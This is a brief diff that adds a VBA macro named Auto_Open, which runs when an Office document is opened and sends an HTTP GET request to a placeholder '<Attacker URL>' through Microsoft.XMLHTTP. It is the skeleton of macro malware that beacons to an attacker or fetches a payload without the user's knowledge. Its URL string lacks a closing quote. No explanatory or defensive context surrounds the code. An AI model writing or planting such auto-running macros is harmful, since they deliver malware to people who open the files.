@@ -1,0 +1,9 @@
+Sub Auto_Open()
+Dim myURL As String
+myUrl = "<Attacker URL>
+
+Dim WinHttpReq As Object
+Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
+WinHttpReq.Open "GET", myURL, False
+WinHttpReq.send
+End Sub
